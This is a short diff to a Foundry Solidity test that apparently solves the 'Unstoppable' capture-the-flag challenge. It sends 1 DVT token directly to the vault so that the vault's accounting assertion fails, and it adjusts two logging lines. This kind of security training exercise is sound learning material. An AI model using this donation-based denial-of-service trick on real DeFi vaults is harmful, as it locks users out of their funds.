@@ -92,9 +92,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        console.log("Vault balance before transfer: ",token.balanceOf(address(vault)));
+        console.log("Vault balance before transfer: ",vault.totalAssets());
         token.transfer(address(vault), 1e18); //e send 1 DVT token to the vault so the assertion at line UnstoppableVault.sol:85 fails
-        console.log("Vault balance after transfer: ",token.balanceOf(address(vault)));
+        console.log("Vault balance after transfer: ",vault.totalAssets());
 
     }
 
